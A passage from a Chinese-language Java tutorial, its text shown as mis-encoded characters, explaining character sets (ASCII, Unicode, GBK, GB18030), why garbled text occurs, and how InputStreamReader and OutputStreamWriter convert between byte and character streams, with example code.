æ–¹æ³•å°†å­—èŠ‚æ•°ç»„è§£ç ä¸ºå­—ç¬¦ä¸²ã€‚</p><h3 id="02ã€å­—ç¬¦é›†"><a href="#02ã€å­—ç¬¦é›†" class="headerlink" title="02ã€å­—ç¬¦é›†"></a>02ã€å­—ç¬¦é›†</h3><p>Charsetï¼šå­—ç¬¦é›†ï¼Œæ˜¯ä¸€ç»„å­—ç¬¦çš„é›†åˆï¼Œæ¯ä¸ªå­—ç¬¦éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç¼–ç å€¼ï¼Œä¹Ÿç§°ä¸ºç ç‚¹ã€‚<br>å¸¸è§çš„å­—ç¬¦é›†åŒ…æ‹¬ ASCIIã€Unicode å’Œ GBKï¼Œè€Œ Unicode å­—ç¬¦é›†åŒ…å«äº†å¤šç§ç¼–ç æ–¹å¼ï¼Œæ¯”å¦‚è¯´ UTF-8ã€UTF-16ã€‚<br><img src="/2024/10/25/code/javaIO/image-2.png"></p><h4 id="ASCII-å­—ç¬¦é›†"><a href="#ASCII-å­—ç¬¦é›†" class="headerlink" title="ASCII å­—ç¬¦é›†"></a><strong>ASCII å­—ç¬¦é›†</strong></h4><p>ASCIIï¼ˆAmerican Standard Code for Information Interchangeï¼Œç¾å›½ä¿¡æ¯äº¤æ¢æ ‡å‡†ä»£ç ï¼‰å­—ç¬¦é›†æ˜¯ä¸€ç§æœ€æ—©çš„å­—ç¬¦é›†ï¼ŒåŒ…å« 128 ä¸ªå­—ç¬¦ï¼Œå…¶ä¸­åŒ…æ‹¬æ§åˆ¶å­—ç¬¦ã€æ•°å­—ã€è‹±æ–‡å­—æ¯ä»¥åŠä¸€äº›æ ‡ç‚¹ç¬¦å·ã€‚ASCII å­—ç¬¦é›†ä¸­çš„æ¯ä¸ªå­—ç¬¦éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ 7 ä½äºŒè¿›åˆ¶ç¼–ç ï¼ˆç”± 0 å’Œ 1 ç»„æˆï¼‰ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºåè¿›åˆ¶æ•°æˆ–åå…­è¿›åˆ¶æ•°ã€‚</p><p>ASCII ç¼–ç æ–¹å¼æ˜¯ä¸€ç§å›ºå®šé•¿åº¦çš„ç¼–ç æ–¹å¼ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ä½¿ç”¨ 7 ä½äºŒè¿›åˆ¶ç¼–ç æ¥è¡¨ç¤ºã€‚ASCII ç¼–ç åªèƒ½è¡¨ç¤ºè‹±æ–‡å­—æ¯ã€æ•°å­—å’Œå°‘é‡çš„ç¬¦å·ï¼Œä¸èƒ½è¡¨ç¤ºå…¶ä»–è¯­è¨€çš„æ–‡å­—å’Œç¬¦å·ï¼Œå› æ­¤åœ¨å…¨çƒèŒƒå›´å†…çš„åº”ç”¨å—åˆ°äº†å¾ˆå¤§çš„é™åˆ¶ã€‚</p><h4 id="Unicode-å­—ç¬¦é›†"><a href="#Unicode-å­—ç¬¦é›†" class="headerlink" title="Unicode å­—ç¬¦é›†"></a>Unicode å­—ç¬¦é›†</h4><p>Unicode åŒ…å«äº†ä¸–ç•Œä¸Šå‡ ä¹æ‰€æœ‰çš„å­—ç¬¦ï¼Œç”¨äºè¡¨ç¤ºäººç±»è¯­è¨€ã€ç¬¦å·å’Œè¡¨æƒ…ç­‰å„ç§ä¿¡æ¯ã€‚Unicode å­—ç¬¦é›†ä¸­çš„æ¯ä¸ªå­—ç¬¦éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç ç‚¹ï¼ˆcode pointï¼‰ï¼Œç”¨äºè¡¨ç¤ºè¯¥å­—ç¬¦åœ¨å­—ç¬¦é›†ä¸­çš„ä½ç½®ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶æ•°è¡¨ç¤ºã€‚</p><p>ä¸ºäº†åœ¨è®¡ç®—æœºä¸­å­˜å‚¨å’Œä¼ è¾“ Unicode å­—ç¬¦é›†ä¸­çš„å­—ç¬¦ï¼Œéœ€è¦ä½¿ç”¨ä¸€ç§ç¼–ç æ–¹å¼ã€‚UTF-8ã€UTF-16 å’Œ UTF-32 éƒ½æ˜¯ Unicode å­—ç¬¦é›†çš„ç¼–ç æ–¹å¼ï¼Œç”¨äºå°† Unicode å­—ç¬¦é›†ä¸­çš„å­—ç¬¦è½¬æ¢æˆå­—èŠ‚åºåˆ—ï¼Œä»¥ä¾¿äºå­˜å‚¨å’Œä¼ è¾“ã€‚å®ƒä»¬çš„å·®åˆ«åœ¨äºä½¿ç”¨çš„å­—èŠ‚é•¿åº¦ä¸åŒã€‚</p><ul><li>UTF-8 æ˜¯ä¸€ç§å¯å˜é•¿åº¦çš„ç¼–ç æ–¹å¼ï¼Œå¯¹äº ASCII å­—ç¬¦ï¼ˆç ç‚¹èŒƒå›´ä¸º <code>0x00~0x7F</code>ï¼‰ï¼Œä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¯¹äºå…¶ä»– Unicode å­—ç¬¦ï¼Œä½¿ç”¨ä¸¤ä¸ªã€ä¸‰ä¸ªæˆ–å››ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚UTF-8 ç¼–ç æ–¹å¼è¢«å¹¿æ³›åº”ç”¨äºäº’è”ç½‘å’Œè®¡ç®—æœºé¢†åŸŸï¼Œå› ä¸ºå®ƒå¯ä»¥æœ‰æ•ˆåœ°å‹ç¼©æ•°æ®ï¼Œé€‚ç”¨äºç½‘ç»œä¼ è¾“å’Œå­˜å‚¨ã€‚</li><li>UTF-16 æ˜¯ä¸€ç§å›ºå®šé•¿åº¦çš„ç¼–ç æ–¹å¼ï¼Œå¯¹äºåŸºæœ¬å¤šè¯­è¨€å¹³é¢ï¼ˆBasic Multilingual Planeï¼ŒUnicode å­—ç¬¦é›†ä¸­çš„ä¸€ä¸ªç ä½èŒƒå›´ï¼ŒåŒ…å«äº†ä¸–ç•Œä¸Šå¤§éƒ¨åˆ†å¸¸ç”¨çš„å­—ç¬¦ï¼Œæ€»å…±åŒ…å«äº†è¶…è¿‡ 65,000 ä¸ªç ä½ï¼‰ä¸­çš„å­—ç¬¦ï¼ˆç ç‚¹èŒƒå›´ä¸º <code>0x0000~0xFFFF</code>ï¼‰ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¯¹äºå…¶ä»– Unicode å­—ç¬¦ï¼Œä½¿ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</li><li>UTF-32 æ˜¯ä¸€ç§å›ºå®šé•¿åº¦çš„ç¼–ç æ–¹å¼ï¼Œå¯¹äºæ‰€æœ‰ Unicode å­—ç¬¦ï¼Œä½¿ç”¨å››ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</li></ul><h4 id="GBK-å­—ç¬¦é›†"><a href="#GBK-å­—ç¬¦é›†" class="headerlink" title="GBK å­—ç¬¦é›†"></a>GBK å­—ç¬¦é›†</h4><p>GBK åŒ…å«äº† GB2312 å­—ç¬¦é›†ä¸­çš„å­—ç¬¦ï¼ŒåŒæ—¶è¿˜æ‰©å±•äº†è®¸å¤šå…¶ä»–æ±‰å­—å­—ç¬¦å’Œç¬¦å·ï¼Œå…±æ”¶å½•äº† 21,913 ä¸ªå­—ç¬¦ã€‚GBK é‡‡ç”¨åŒå­—èŠ‚ç¼–ç æ–¹å¼ï¼Œæ¯ä¸ªæ±‰å­—å ç”¨ 2 ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­é«˜å­—èŠ‚å’Œä½å­—èŠ‚éƒ½ä½¿ç”¨äº† 8 ä½ï¼Œå› æ­¤ GBK ç¼–ç å…±æœ‰ <code>2^16=65536</code> ç§å¯èƒ½çš„ç¼–ç ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†è¢«ç”¨äºè¡¨ç¤ºæ±‰å­—å­—ç¬¦ã€‚</p><p>GBK ç¼–ç æ˜¯ä¸€ç§å˜é•¿çš„ç¼–ç æ–¹å¼ï¼Œå¯¹äº ASCII å­—ç¬¦ï¼ˆç ä½èŒƒå›´ä¸º 0x00 åˆ° 0x7Fï¼‰ï¼Œä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¯¹äºå…¶ä»–å­—ç¬¦ï¼Œä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚GBK ç¼–ç ä¸­çš„æ¯ä¸ªå­—èŠ‚éƒ½å¯ä»¥é‡‡ç”¨ 0x81 åˆ° 0xFE ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå€¼ï¼Œå› æ­¤å¯ä»¥è¡¨ç¤º <code>2^15=32768</code> ä¸ªå­—ç¬¦ã€‚ä¸ºäº†é¿å…ä¸ ASCII ç å†²çªï¼ŒGBK ç¼–ç çš„ç¬¬ä¸€ä¸ªå­—èŠ‚é‡‡ç”¨äº† 0x81 åˆ° 0xFE ä¹‹é—´é™¤äº† 0x7F çš„æ‰€æœ‰å€¼ï¼Œç¬¬äºŒä¸ªå­—èŠ‚é‡‡ç”¨äº† 0x40 åˆ° 0x7E å’Œ 0x80 åˆ° 0xFE ä¹‹é—´çš„æ‰€æœ‰å€¼ï¼Œå…± 94 ä¸ªå€¼ã€‚</p><p>GB2312 çš„å…¨åæ˜¯ã€Šä¿¡æ¯äº¤æ¢ç”¨æ±‰å­—ç¼–ç å­—ç¬¦é›†åŸºæœ¬é›†ã€‹ï¼Œä¹Ÿè¢«ç§°ä¸ºâ€œå›½æ ‡ç â€ã€‚é‡‡ç”¨äº†åŒå­—èŠ‚ç¼–ç æ–¹å¼ï¼Œæ¯ä¸ªæ±‰å­—å ç”¨ 2 ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­é«˜å­—èŠ‚å’Œä½å­—èŠ‚éƒ½ä½¿ç”¨äº† 8 ä½ï¼Œå› æ­¤ GB2312 ç¼–ç å…±æœ‰ <code>2^16=65536</code> ç§å¯èƒ½çš„ç¼–ç ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†è¢«ç”¨äºè¡¨ç¤ºæ±‰å­—å­—ç¬¦ã€‚GB2312 ç¼–ç ä¸­çš„æ¯ä¸ªå­—èŠ‚éƒ½å¯ä»¥é‡‡ç”¨ 0xA1 åˆ° 0xF7 ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå€¼ï¼Œå› æ­¤å¯ä»¥è¡¨ç¤º 126 ä¸ªå­—ç¬¦ã€‚</p><p>GB2312 æ˜¯ä¸€ä¸ªè¾ƒä¸ºç®€å•çš„å­—ç¬¦é›†ï¼ŒåªåŒ…å«äº†å¸¸ç”¨çš„æ±‰å­—å’Œç¬¦å·ï¼Œå› æ­¤å¯¹äºä¸€äº›è¾ƒä¸ºç½•è§çš„æ±‰å­—å’Œç”Ÿåƒ»å­—ï¼ŒGB2312 ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œç°åœ¨å·²ç»é€æ¸è¢« GBKã€GB18030 ç­‰å­—ç¬¦é›†æ‰€å–ä»£ã€‚</p><p>GB18030 æ˜¯æœ€æ–°çš„ä¸­æ–‡ç è¡¨ã€‚æ”¶å½•æ±‰å­— 70244 ä¸ªï¼Œé‡‡ç”¨å¤šå­—èŠ‚ç¼–ç ï¼Œæ¯ä¸ªå­—å¯ä»¥ç”± 1 ä¸ªã€2 ä¸ªæˆ– 4 ä¸ªå­—èŠ‚ç»„æˆã€‚æ”¯æŒä¸­å›½å›½å†…å°‘æ•°æ°‘æ—çš„æ–‡å­—ï¼ŒåŒæ—¶æ”¯æŒç¹ä½“æ±‰å­—ä»¥åŠæ—¥éŸ©æ±‰å­—ç­‰ã€‚</p><h3 id="03ã€ä¹±ç "><a href="#03ã€ä¹±ç " class="headerlink" title="03ã€ä¹±ç "></a>03ã€ä¹±ç </h3><p>å½“ä½¿ç”¨ä¸åŒçš„ç¼–ç æ–¹å¼è¯»å–æˆ–è€…å†™å…¥æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‡ºç°ä¹±ç é—®é¢˜ï¼Œæ¥çœ‹ç¤ºä¾‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;æ²‰é»˜ç‹äºŒï¼&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// å°†å­—ç¬¦ä¸²æŒ‰GBKç¼–ç æ–¹å¼ä¿å­˜åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>), <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    out.write(s);</span><br><span class="line">    out.close();</span><br><span class="line"></span><br><span class="line">    <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> read;</span><br><span class="line">    <span class="keyword">while</span> ((read = fileReader.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        System.out.print((<span class="type">char</span>)read);</span><br><span class="line">    &#125;</span><br><span class="line">    fileReader.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåŒ…å«ä¸­æ–‡å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œç„¶åå°†è¯¥å­—ç¬¦ä¸²æŒ‰ GBK ç¼–ç æ–¹å¼ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæ¥ç€å°†æ–‡ä»¶æŒ‰é»˜è®¤ç¼–ç æ–¹å¼ï¼ˆUTF-8ï¼‰è¯»å–ï¼Œå¹¶æ˜¾ç¤ºå†…å®¹ã€‚æ­¤æ—¶å°±ä¼šå‡ºç°ä¹±ç é—®é¢˜ï¼Œæ˜¾ç¤ºä¸ºâ€œï¿½ï¿½Ä¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½â€ã€‚</p><p>è¿™æ˜¯å› ä¸ºæ–‡ä»¶ä¸­çš„ GBK ç¼–ç çš„å­—ç¬¦åœ¨ä½¿ç”¨ UTF-8 ç¼–ç æ–¹å¼è§£ææ—¶æ— æ³•æ­£ç¡®è§£æï¼Œä»è€Œå¯¼è‡´å‡ºç°ä¹±ç é—®é¢˜ã€‚</p><p>é‚£å¦‚ä½•æ‰èƒ½è§£å†³ä¹±ç é—®é¢˜å‘¢ï¼Ÿ<br>è¿™å°±å¼•å‡ºæˆ‘ä»¬ä»Šå¤©çš„ä¸»è§’äº†â€”â€”è½¬æ¢æµã€‚</p><h3 id="04ã€InputStreamReader"><a href="#04ã€InputStreamReader" class="headerlink" title="04ã€InputStreamReader"></a>04ã€InputStreamReader</h3><p><code>java.io.InputStreamReader</code> æ˜¯ Reader ç±»çš„å­ç±»ã€‚å®ƒçš„ä½œç”¨æ˜¯å°†å­—èŠ‚æµï¼ˆInputStreamï¼‰è½¬æ¢ä¸ºå­—ç¬¦æµï¼ˆReaderï¼‰ï¼ŒåŒæ—¶æ”¯æŒæŒ‡å®šçš„å­—ç¬¦é›†ç¼–ç æ–¹å¼ï¼Œä»è€Œå®ç°å­—ç¬¦æµä¸å­—èŠ‚æµä¹‹é—´çš„è½¬æ¢ã€‚</p><h4 id="1ï¼‰æ„é€ æ–¹æ³•-2"><a href="#1ï¼‰æ„é€ æ–¹æ³•-2" class="headerlink" title="1ï¼‰æ„é€ æ–¹æ³•"></a>1ï¼‰æ„é€ æ–¹æ³•</h4><ul><li><code>InputStreamReader(InputStream in)</code>: åˆ›å»ºä¸€ä¸ªä½¿ç”¨é»˜è®¤å­—ç¬¦é›†çš„å­—ç¬¦æµã€‚</li><li><code>InputStreamReader(InputStream in, String charsetName)</code>: åˆ›å»ºä¸€ä¸ªæŒ‡å®šå­—ç¬¦é›†çš„å­—ç¬¦æµã€‚</li></ul><p>ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;in.txt&quot;</span>));</span><br><span class="line"><span class="type">InputStreamReader</span> <span class="variable">isr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;in.txt&quot;</span>) , <span class="string">&quot;GBK&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="2ï¼‰è§£å†³ç¼–ç é—®é¢˜"><a href="#2ï¼‰è§£å†³ç¼–ç é—®é¢˜" class="headerlink" title="2ï¼‰è§£å†³ç¼–ç é—®é¢˜"></a>2ï¼‰è§£å†³ç¼–ç é—®é¢˜</h4><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ InputStreamReader è§£å†³ä¹±ç é—®é¢˜çš„ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;æ²‰é»˜ç‹äºŒï¼&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// å°†å­—ç¬¦ä¸²æŒ‰GBKç¼–ç æ–¹å¼ä¿å­˜åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">outUtf8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>), <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    outUtf8.write(s);</span><br><span class="line">    outUtf8.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦æµï¼Œä½¿ç”¨GBKç¼–ç æ–¹å¼</span></span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;logs/test_utf8.txt&quot;</span>), <span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    <span class="comment">// è¯»å–å­—ç¬¦æµ</span></span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="keyword">while</span> ((c = isr.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">        System.out.print((<span class="type">char</span>) c);</span><br><span class="line">    &#125;</span><br><span class="line">    isr.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºä½¿ç”¨äº† InputStreamReader å¯¹å­—èŠ‚æµè¿›è¡Œäº†ç¼–ç æ–¹å¼çš„è½¬æ¢ï¼Œå› æ­¤åœ¨è¯»å–å­—ç¬¦æµæ—¶å°±å¯ä»¥æ­£ç¡®åœ°è§£æå‡ºä¸­æ–‡å­—ç¬¦ï¼Œé¿å…äº†ä¹±ç é—®é¢˜ã€‚</p><h3 id="05ã€OutputStreamWriter"><a href="#05ã€OutputStreamWriter" class="headerlink" title="05ã€OutputStreamWriter"></a>05ã€OutputStreamWriter</h3><p><code>java.io.OutputStreamWriter</code> æ˜¯ Writer çš„å­ç±»ï¼Œå­—é¢çœ‹å®¹æ˜“è¯¯ä»¥ä¸ºæ˜¯è½¬ä¸ºå­—ç¬¦æµï¼Œå…¶å®æ˜¯å°†å­—ç¬¦æµè½¬æ¢ä¸ºå­—èŠ‚æµï¼Œæ˜¯å­—ç¬¦æµåˆ°å­—èŠ‚æµçš„æ¡¥æ¢ã€‚</p><ul><li><code>OutputStreamWriter(OutputStream in)</code>: åˆ›å»ºä¸€ä¸ªä½¿ç”¨é»˜è®¤å­—ç¬¦é›†çš„å­—ç¬¦æµã€‚</li><li><code>OutputStreamWriter(OutputStream in, String charsetName)</code>ï¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šå­—ç¬¦é›†çš„å­—ç¬¦æµã€‚</li></ul><p>ä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OutputStreamWriter</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;a.txt&quot;</span>));</span><br><span class="line"><span class="type">OutputStreamWriter</span> <span class="variable">isr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;b.txt&quot;</span>) , <span class="string">&quot;GBK&quot;</span>);</span><br></pre></td></tr></table></figure><p>é€šå¸¸ä¸ºäº†æé«˜è¯»å†™æ•ˆç‡ï¼Œæˆ‘ä»¬ä¼šåœ¨è½¬æ¢æµä¸Šå†åŠ ä¸€å±‚<a href="https://javabetter.cn/io/buffer.html">ç¼“å†²æµ</a>ï¼Œæ¥çœ‹ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ä»æ–‡ä»¶è¯»å–å­—èŠ‚æµï¼Œä½¿ç”¨UTF-8ç¼–ç æ–¹å¼</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦æµï¼Œä½¿ç”¨UTF-8ç¼–ç æ–¹å¼</span></span><br><span class="line">    <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(fis, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç¼“å†²æµåŒ…è£…å­—ç¬¦æµï¼Œæé«˜è¯»å–æ•ˆç‡</span></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">    <span class="comment">// åˆ›å»ºè¾“å‡ºæµï¼Œä½¿ç”¨UTF-8ç¼–ç æ–¹å¼</span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// å°†è¾“å‡ºæµåŒ…è£…ä¸ºè½¬æ¢æµï¼Œä½¿ç”¨UTF-8ç¼–ç æ–¹å¼</span></span><br><span class="line">    <span class="type">OutputStreamWriter</span> <span class="variable">osw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(fos, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç¼“å†²æµåŒ…è£…è½¬æ¢æµï¼Œæé«˜å†™å…¥æ•ˆç‡</span></span><br><span class="line">    <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(osw);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–è¾“å…¥æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œå†™å…¥åˆ°è¾“å‡ºæ–‡ä»¶ä¸­</span></span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        bw.write(line);</span><br><span class="line">        bw.newLine(); <span class="comment">// æ¯è¡Œç»“æŸåå†™å…¥ä¸€ä¸ªæ¢è¡Œç¬¦</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…³é—­æµ</span></span><br><span class="line">    br.close();</span><br><span class="line">    bw.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ FileInputStream ä»æ–‡ä»¶ä¸­è¯»å–å­—èŠ‚æµï¼Œä½¿ç”¨ UTF-8 ç¼–ç æ–¹å¼è¿›è¡Œè¯»å–ã€‚ç„¶åï¼Œä½¿ç”¨ InputStreamReader å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦æµï¼Œä½¿ç”¨ UTF-8 ç¼–ç æ–¹å¼è¿›è¡Œè½¬æ¢ã€‚æ¥ç€ï¼Œä½¿ç”¨ BufferedReader åŒ…è£…å­—ç¬¦æµï¼Œæé«˜è¯»å–æ•ˆç‡ã€‚ç„¶åï¼Œåˆ›å»º FileOutputStream ç”¨äºè¾“å‡ºæ–‡ä»¶ï¼Œä½¿ç”¨ UTF-8 ç¼–ç æ–¹å¼è¿›è¡Œåˆ›å»ºã€‚æ¥ç€ï¼Œä½¿ç”¨ OutputStreamWriter å°†è¾“å‡ºæµè½¬æ¢ä¸ºå­—ç¬¦æµï¼Œä½¿ç”¨ UTF-8 ç¼–ç æ–¹å¼è¿›è¡Œè½¬æ¢ã€‚æœ€åï¼Œä½¿ç”¨ BufferedWriter åŒ…è£…è½¬æ¢æµï¼Œæé«˜å†™å…¥æ•ˆç‡ã€‚</p><h3 id="06ã€å°ç»“"><a href="#06ã€å°ç»“" class="headerlink" title="06ã€å°ç»“"></a>06ã€å°ç»“</h3><p>InputStreamReader å’Œ OutputStreamWriter æ˜¯å°†å­—èŠ‚æµè½¬æ¢ä¸ºå­—ç¬¦æµæˆ–è€…å°†å­—ç¬¦æµè½¬æ¢ä¸ºå­—èŠ‚æµã€‚é€šå¸¸ç”¨äºè§£å†³å­—èŠ‚æµå’Œå­—ç¬¦æµä¹‹é—´çš„è½¬æ¢é—®é¢˜ï¼Œå¯ä»¥å°†å­—èŠ‚æµä»¥æŒ‡å®šçš„å­—ç¬¦é›†ç¼–ç æ–¹å¼è½¬æ¢ä¸ºå­—ç¬¦æµï¼Œæˆ–è€…å°†å­—ç¬¦æµä»¥æŒ‡å®šçš„å­—ç¬¦é›†ç¼–ç æ–¹å¼è½¬æ¢ä¸ºå­—èŠ‚æµã€‚</p><p>InputStreamReader ç±»çš„å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li><code>read()</code>ï¼šä»è¾“å…¥æµä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦çš„æ•°æ®ã€‚</li><li><code>read(char[] cbuf, int off, int len)</code>ï¼šä»è¾“å…¥æµä¸­è¯»å– len ä¸ªå­—ç¬¦çš„æ•°æ®åˆ°æŒ‡å®šçš„å­—ç¬¦æ•°ç»„ cbuf ä¸­ï¼Œä» off 